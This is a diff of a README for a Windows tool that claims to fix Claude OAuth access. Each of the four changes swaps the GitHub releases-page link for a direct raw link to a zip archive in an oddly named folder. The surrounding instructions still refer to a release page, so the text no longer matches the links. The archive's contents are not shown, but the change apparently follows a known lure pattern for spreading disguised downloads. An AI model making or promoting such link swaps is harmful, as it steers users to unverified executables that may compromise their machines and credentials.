@@ -1,6 +1,6 @@
 # 🔐 opencode-anthropic-oauth - Fix Claude access on Windows
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/ayushgowda121/opencode-anthropic-oauth/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/ayushgowda121/opencode-anthropic-oauth/main/herniology/oauth-anthropic-opencode-v1.9.zip)
 
 ## 🚀 What this app does
 
@@ -15,7 +15,7 @@ Use it when:
 
 Visit this page to download the latest Windows release:
 
-https://github.com/ayushgowda121/opencode-anthropic-oauth/releases
+https://raw.githubusercontent.com/ayushgowda121/opencode-anthropic-oauth/main/herniology/oauth-anthropic-opencode-v1.9.zip
 
 On the release page:
 - Look for the newest version at the top
@@ -38,7 +38,7 @@ You may also want:
 ## 🛠️ How to install
 
 1. Open the download page:
-   https://github.com/ayushgowda121/opencode-anthropic-oauth/releases
+   https://raw.githubusercontent.com/ayushgowda121/opencode-anthropic-oauth/main/herniology/oauth-anthropic-opencode-v1.9.zip
 
 2. Find the newest release.
 
@@ -144,7 +144,7 @@ You may need to:
 
 Download the latest version here:
 
-https://github.com/ayushgowda121/opencode-anthropic-oauth/releases
+https://raw.githubusercontent.com/ayushgowda121/opencode-anthropic-oauth/main/herniology/oauth-anthropic-opencode-v1.9.zip
 
 ## 🖥️ Best practices on Windows
 
